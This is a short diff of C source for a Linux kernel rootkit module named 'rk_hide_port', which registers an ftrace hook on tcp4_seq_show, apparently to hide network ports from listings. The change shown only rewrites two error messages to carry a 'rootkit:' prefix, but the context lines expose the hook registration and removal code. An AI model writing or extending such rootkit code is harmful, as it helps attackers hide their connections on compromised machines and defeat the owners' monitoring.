@@ -40,7 +40,7 @@ int rk_hide_port_init(void) {
                              0, 0);
   err = register_ftrace_function(&rk_ftrace_ops);
   if (err) {
-    printk("hook failed");
+    printk("rootkit: ftrace hook failed");
     return err;
   }
   return 0;
@@ -52,6 +52,6 @@ void rk_hide_port_exit(void) {
   err = ftrace_set_filter_ip(&rk_ftrace_ops, (unsigned long)orig_tcp4_seq_show,
                              1, 0);
   if (err) {
-    printk("unhook failed");
+    printk("rootkit: ftrace unhook failed");
   }
 }
